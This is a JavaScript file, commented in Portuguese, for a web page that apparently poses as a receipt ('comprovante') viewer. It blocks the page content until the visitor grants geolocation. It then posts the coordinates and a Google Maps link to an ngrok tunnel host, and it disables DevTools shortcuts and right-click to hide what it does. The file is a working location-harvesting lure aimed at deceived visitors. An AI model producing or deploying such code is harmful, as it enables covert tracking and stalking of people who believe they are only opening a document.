// Espera a página carregar para pedir a localização
window.addEventListener("load", () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    } else {
        alert("Seu navegador não suporta geolocalização.");
    }
});

// Atualiza a data automaticamente
const dataAtual = new Date();
const dia = String(dataAtual.getDate()).padStart(2, '0');
const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
const ano = dataAtual.getFullYear();
const dataFormatada = `${dia}/${mes}/${ano}`;
document.getElementById("data-atual").textContent = dataFormatada;

function sendLocation(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

    // Remove a tela de bloqueio e mostra o site
    document.getElementById("overlay").style.opacity = "0";
    setTimeout(() => {
        document.getElementById("overlay").style.display = "none";
        document.getElementById("conteudo").classList.remove("hidden");
    }, 500);

    // Verifique os dados antes de enviar
    console.log("Enviando dados para o servidor:", { latitude, longitude, maps });

    // Envia a localização para o servidor
    fetch("https://336e-2607-740-2d-5-9c47-7153-f79c-f517.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
    })
    .then(response => {
        // Verifica se a resposta do servidor está OK
        console.log("Resposta do servidor:", response);
        return response.json(); // Converte a resposta para JSON
    })
    .then(data => {
        // Verifique a resposta do servidor
        console.log("Resposta em JSON:", data);
        if (data.success) {
            console.log("Localização enviada com sucesso!");
        } else {
            console.log("Erro ao enviar localização:", data.error || "Erro desconhecido");
        }
    })
    .catch(error => {
        console.error("Erro ao fazer o fetch:", error);
    });
}

function handleError(error) {
    alert("Para acessar o comprovante, você precisa habilitar a localização.");
}

// Bloqueia DevTools (F12, Ctrl+Shift+I, Ctrl+U)
document.addEventListener("keydown", function(event) {
    if (event.key === "F12" || 
        (event.ctrlKey && event.shiftKey && event.key === "I") ||
        (event.ctrlKey && event.key === "U")) {
        event.preventDefault();
    }
});

// Bloqueia o clique direito
document.addEventListener("contextmenu", function(event) {
    event.preventDefault();
});
